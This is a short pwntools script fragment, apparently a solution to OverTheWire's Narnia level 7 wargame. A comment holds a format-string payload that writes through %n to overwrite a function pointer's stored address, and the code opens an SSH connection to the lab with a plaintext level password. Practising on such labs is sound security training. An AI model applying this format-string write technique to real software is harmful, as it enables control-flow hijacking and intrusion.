from pwn import *

'''
local exploit:
    r $(python -c 'print "\xf8\xd0\xff\xff" + "%42u" + "%n"')
It will overwrite the address stored in ptrf pointer.
'''
con = ssh('narnia7', 'narnia.labs.overthewire.org', password='ahkiaziphu', port=2226)
